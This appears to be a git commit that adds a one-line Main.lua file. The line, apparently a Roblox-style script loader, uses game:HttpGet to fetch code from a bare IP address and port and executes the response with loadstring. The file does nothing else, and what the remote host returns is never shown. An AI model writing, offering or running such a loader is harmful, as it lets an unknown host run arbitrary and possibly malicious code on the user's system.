ed73451d904f0157df6daf477f124310a776e64d
tabgranty <124298824+tabgranty@users.noreply.github.com>
2026-02-09 12:28:24 -0600

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjRjZGJlZjIxLTAxYTktNDc3Yy05NjI0LWQzYmJhYTY4MGU1OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
